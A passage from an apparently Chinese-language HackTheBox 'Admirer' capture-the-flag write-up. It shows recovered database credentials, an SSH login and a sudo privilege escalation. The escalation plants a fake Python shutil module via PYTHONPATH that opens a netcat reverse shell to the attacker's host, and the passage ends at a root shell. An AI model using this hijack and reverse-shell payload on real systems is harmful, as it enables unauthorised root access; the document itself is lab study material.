class=\&#x27;thumb\&#x27;&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;a href=\&#x27;\&quot;.$row[\&quot;image_path\&quot;].\&quot;\&#x27; class=\&#x27;image\&#x27;&gt;&lt;img src=\&#x27;\&quot;.$row[\&quot;thumb_path\&quot;].\&quot;\&#x27; alt=\&#x27;\&#x27; /&gt;&lt;/a&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;h2&gt;\&quot;.$row[\&quot;title\&quot;].\&quot;&lt;/h2&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;p&gt;\&quot;.$row[\&quot;text\&quot;].\&quot;&lt;/p&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;/article&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125; else &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            echo \&quot;0 results\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $conn-&gt;close();&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    ?&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Footer --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;footer id=\&quot;footer\&quot; class=\&quot;panel\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;div class=\&quot;inner split\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Allow yourself to be amazed&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;p&gt;Skills are not to be envied, but to feel inspired by.&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    Visual arts and music are there to take care of your soul.&lt;br&gt;&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    Let your senses soak up these wonders...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/p&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Follow me on ...&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;ul class=\&quot;icons\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-twitter\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-facebook-f\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Facebook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-instagram\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Instagram&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-github\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;GitHub&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-dribbble\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Dribbble&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-linkedin-in\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;LinkedIn&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Get in touch&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;form method=\&quot;post\&quot; action=\&quot;#\&quot;&gt;&lt;!-- Still under development... This does not send anything yet, but it looks nice! --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;div class=\&quot;fields\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field half\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;input type=\&quot;text\&quot; name=\&quot;name\&quot; id=\&quot;name\&quot; placeholder=\&quot;Name\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field half\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;input type=\&quot;text\&quot; name=\&quot;email\&quot; id=\&quot;email\&quot; placeholder=\&quot;Email\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;textarea name=\&quot;message\&quot; id=\&quot;message\&quot; rows=\&quot;4\&quot; placeholder=\&quot;Message\&quot;&gt;&lt;/textarea&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;ul class=\&quot;actions\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;li&gt;&lt;input type=\&quot;submit\&quot; value=\&quot;Send\&quot; class=\&quot;primary\&quot; /&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;li&gt;&lt;input type=\&quot;reset\&quot; value=\&quot;Reset\&quot; /&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/form&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/footer&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;!-- Scripts --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/jquery.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/jquery.poptrox.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/browser.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/breakpoints.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/util.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/main.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;/body&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;/html&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">-- <span class="number">2020</span><span class="number">-09</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">07</span>:<span class="number">51</span></span><br></pre></td></tr></table></figure><p><code>æ‰¾åˆ°ç”¨æˆ·åä¸å¯†ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$servername</span> = \&quot;localhost\&quot;;</span><br><span class="line"><span class="variable">$username</span> = \&quot;waldo\&quot;;<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">$password = \&quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;\&quot;;</span></span><br><span class="line"><span class="string">$dbname = \&quot;admirerdb\&quot;;</span></span><br></pre></td></tr></table></figure><h2 id="0x08-sshç™»å…¥"><a href="#0x08-sshç™»å…¥" class="headerlink" title="0x08.sshç™»å…¥"></a>0x08.sshç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># cat user </span></span><br><span class="line">waldo   &amp;&lt;h5b~yK3F<span class="comment">#&#123;PaPB&amp;dA&#125;&#123;H&gt;</span></span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ssh waldo@10.10.10.187</span></span><br><span class="line">waldo@10.10.10.187<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Devuan GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have new mail.</span></span><br><span class="line"><span class="string">Last login: Sat Sep  5 09:06:54 2020 from 10.10.14.80</span></span><br><span class="line"><span class="string">waldo@admirer:~$ </span></span><br></pre></td></tr></table></figure><p><code>æ‰¾åˆ°flag</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ ls</span><br><span class="line"><span class="built_in">test</span>  user.txt</span><br><span class="line">waldo@admirer:~$ cat user.txt </span><br><span class="line">*******************************</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure><h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><blockquote><p>/opt/scripts/admin_tasks.shå¯ä»¥ç”¨æ¥ææƒ</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span><br><span class="line"></span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure><blockquote><p>æŸ¥çœ‹æ­¤è„šæœ¬ï¼Œå‘ç°æ­¤è„šæœ¬ç”¨æ¥å¤‡ä»½æ•°æ®</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:/opt/scripts$ ls</span><br><span class="line">admin_tasks.sh  backup.py</span><br><span class="line">waldo@admirer:/opt/scripts$ cat admin_tasks.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-interactive way, to be used by the web interface</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    option=<span class="variable">$1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ;;</span><br><span class="line">        2) view_users ;;</span><br><span class="line">        3) view_crontab ;;</span><br><span class="line">        4) backup_passwd ;;</span><br><span class="line">        5) backup_shadow ;;</span><br><span class="line">        6) backup_web ;;</span><br><span class="line">        7) backup_db ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive way, to be called from the command line</span></span><br><span class="line">options=(<span class="string">&quot;View system uptime&quot;</span></span><br><span class="line">         <span class="string">&quot;View logged in users&quot;</span></span><br><span class="line">         <span class="string">&quot;View crontab&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup passwd file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup shadow file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup web data&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup DB&quot;</span></span><br><span class="line">         <span class="string">&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[[[ System Administration Menu ]]]&quot;</span></span><br><span class="line">PS3=<span class="string">&quot;Choose an option: &quot;</span></span><br><span class="line">COLUMNS=11</span><br><span class="line">select opt <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$REPLY</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ; <span class="built_in">break</span> ;;</span><br><span class="line">        2) view_users ; <span class="built_in">break</span> ;;</span><br><span class="line">        3) view_crontab ; <span class="built_in">break</span> ;;</span><br><span class="line">        4) backup_passwd ; <span class="built_in">break</span> ;;</span><br><span class="line">        5) backup_shadow ; <span class="built_in">break</span> ;;</span><br><span class="line">        6) backup_web ; <span class="built_in">break</span> ;;</span><br><span class="line">        7) backup_db ; <span class="built_in">break</span> ;;</span><br><span class="line">        8) <span class="built_in">echo</span> <span class="string">&quot;Bye!&quot;</span> ; <span class="built_in">break</span> ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">waldo@admirer:/opt/scripts$</span><br></pre></td></tr></table></figure><blockquote><p>æŸ¥çœ‹backup.pyï¼Œå‘ç°æ­¤è„šæœ¬ç”¨æ¥å°†/var/www/html/å¤‡ä»½åˆ°ftpç›®å½•ä¸‹çš„/var/backups/htmlï¼Œå¹¶å‹ç¼©ã€‚</p><p>ä¸¤ä¸ªè„šæœ¬ä¸€èµ·åˆ†æä¸ºï¼Œè¿è¡Œadmin_tasks.shå°†è°ƒç”¨backup.pyå¤‡ä»½æ•°æ®ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:/opt/scripts$ cat backup.py </span><br><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">from shutil import make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br><span class="line">waldo@admirer:/opt/scripts$</span><br></pre></td></tr></table></figure><blockquote><p>å°è¯•ä¿®æ”¹backup.shï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ã€‚</p><p>é‡æ–°åˆ›å»ºbackup.shï¼Œå¹¶ä¿®æ”¹pythonè°ƒç”¨è·¯å¾„ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ mkdir fjy</span><br><span class="line">waldo@admirer:~$ <span class="built_in">cd</span> fjy</span><br><span class="line">waldo@admirer:~/fjy$ cat shutil.py </span><br><span class="line">import os</span><br><span class="line">def make_archive(x,y,z):</span><br><span class="line">    os.system(<span class="string">&quot;nc 10.10.17.216 6666 -e &#x27;/bin/bash&#x27;&quot;</span>)</span><br><span class="line">waldo@admirer:~/fjy$</span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~/fjy$ sudo PYTHONPATH=~/fjy /opt/scripts/admin_tasks.sh </span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line"></span><br><span class="line">[[[ System Administration Menu ]]]</span><br><span class="line">1) View system uptime</span><br><span class="line">2) View logged <span class="keyword">in</span> users</span><br><span class="line">3) View crontab</span><br><span class="line">4) Backup passwd file</span><br><span class="line">5) Backup shadow file</span><br><span class="line">6) Backup web data</span><br><span class="line">7) Backup DB</span><br><span class="line">8) Quit</span><br><span class="line">Choose an option:</span><br></pre></td></tr></table></figure><p><code>é€‰æ‹©6</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Choose an option: 6</span><br><span class="line">Running backup script <span class="keyword">in</span> the background, it might take a <span class="keyword">while</span>...</span><br><span class="line">waldo@admirer:~/fjy$</span><br></pre></td></tr></table></figure><p><code>kaliå¾—åˆ°shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.187] 38682</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># ^Z</span></span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line"></span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># ls</span></span><br><span class="line">shutil.py</span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># cd</span></span><br><span class="line">root@admirer:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@admirer:~<span class="comment"># cat root.txt 